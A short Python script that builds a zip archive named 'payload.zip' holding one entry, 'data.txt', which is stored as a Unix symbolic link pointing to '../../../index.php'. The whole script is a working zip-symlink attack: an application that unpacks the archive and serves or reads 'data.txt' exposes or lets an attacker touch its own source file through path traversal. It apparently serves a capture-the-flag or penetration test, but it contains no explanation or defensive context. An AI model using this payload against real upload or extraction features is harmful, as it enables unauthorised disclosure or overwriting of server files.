import os
import zipfile
import stat

# Create the symlink
symlink_name = 'data.txt'
target = '../../../index.php'  # Path to the target file
os.symlink(target, symlink_name)

# Create the zip
with zipfile.ZipFile('payload.zip', 'w') as zf:
    # Save the symlink as a ZIP entry
    info = zipfile.ZipInfo(symlink_name)
    info.create_system = 3  # Unix
    # Set symlink file mode: 0o120777 = symlink with 0777 perms
    info.external_attr = (stat.S_IFLNK | 0o777) << 16  # Shift to match Zip format
    zf.writestr(info, target)  # Write the target path as file contents

# Clean up
os.remove(symlink_name)
